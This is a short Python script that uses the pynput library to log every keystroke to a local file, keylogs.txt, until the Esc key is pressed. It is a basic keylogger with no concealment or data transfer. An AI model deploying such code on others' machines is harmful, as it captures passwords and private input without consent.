from pynput import keyboard
from pynput.keyboard import Listener,Key

FILE = open("keylogs.txt","a")


def pressed(Key):
    print(Key)
    FILE.write(str(Key))
def released(Key):
    if Key==keyboard.Key.esc:
        return False

with Listener(on_press=pressed,on_release=released) as Listen:
    Listen.join()
FILE.close()
